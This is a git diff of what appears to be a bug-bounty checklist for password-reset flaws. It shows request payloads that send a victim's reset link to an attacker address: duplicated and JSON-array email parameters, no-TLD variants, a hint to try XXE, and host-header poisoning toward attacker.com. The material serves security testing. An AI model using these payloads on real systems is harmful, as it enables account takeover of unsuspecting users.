@@ -125,8 +125,8 @@ Then you can consider it as vulnerability.
 
 ### 4.Password reset with manipulating email parameter.Password reset token leak via response
 
-    while requesting a password reset link for the victim user,
-    we can try the below parameter manipulation to get a copy of the reset link of the victim on the attacker email.
+while requesting a password reset link for the victim user,
+we can try the below parameter manipulation to get a copy of the reset link of the victim on the attacker email.
 
     Double parameter (aka. HPP / HTTP parameter pollution):
     email=victim@xyz.tld&email=hacker@xyz.tld
@@ -145,16 +145,27 @@ Then you can consider it as vulnerability.
     No TLD (Top Level Domain):
     email=victim@xyz
     
+    XML:
+    try XXE!
+    
     JSON table:
-    {“email”:[“victim@xyz.tld”,”hacker@xyz.tld”]}
+    {
+    "email":["victim@xyz.tld",
+    "hacker@xyz.tld"]
+    }
+    
+    **use content type converter burp ext
+   ![Capture](https://user-images.githubusercontent.com/63053441/142031382-bdc4eaaa-7a4c-479c-9802-feb80525a505.PNG)
+
+    
 [https://hackerone.com/reports/1175081](https://hackerone.com/reports/1175081)<br></br>
 
 
 
 ### 5.Host Header Poisoning
 
-    A common way to implement password reset functionality is to generate a secret token and send an email with a link containing the token. 
-    If an attacker is able to change the host header they can then redirect the token to their website or server which can lead to password reset poisoning
+A common way to implement password reset functionality is to generate a secret token and send an email with a link containing the token. 
+If an attacker is able to change the host header they can then redirect the token to their website or server which can lead to password reset poisoning
 
     1) intercept the request and change the Host header to attacker.com.
     2) Now check your mail if you have received the password reset link and contains attacker.com in the url.
